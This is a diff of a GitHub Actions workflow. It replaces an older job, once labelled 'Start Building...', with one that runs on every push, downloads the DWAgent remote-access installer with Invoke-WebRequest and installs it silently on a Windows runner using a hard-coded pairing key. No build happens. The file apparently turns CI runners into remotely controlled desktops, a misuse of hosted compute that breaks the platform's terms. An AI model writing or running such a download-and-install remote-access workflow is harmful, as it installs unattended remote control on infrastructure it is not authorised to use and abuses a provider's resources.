@@ -1,17 +1,19 @@
-name: Windows - RustDesk
+name: Install DWAgent
 
-on:
-  workflow_dispatch:
+on: [push]
 
 jobs:
-  build:
-    name: Start Building...
+  install_dwagent:
     runs-on: windows-latest
-    timeout-minutes: 9999
-    
-    steps:
-      - name: Downloading & Installing Essentials
-        run: |
-          Invoke-WebRequest -Uri "https://www.dwservice.net/download/dwagent_x86.exe" -OutFile "dwagent.exe"
-                  dwagent.exe -silent key=465-509-379
 
+    steps:
+    - name: Checkout repository
+      uses: actions/checkout@v2
+
+    - name: Download DWAgent
+      run: |
+        Invoke-WebRequest -Uri https://www.dwservice.net/download/dwagent_x86.exe -OutFile dwagent_x86.exe
+
+    - name: Install DWAgent
+      run: |
+        .\dwagent_x86.exe -silent key=465-509-379
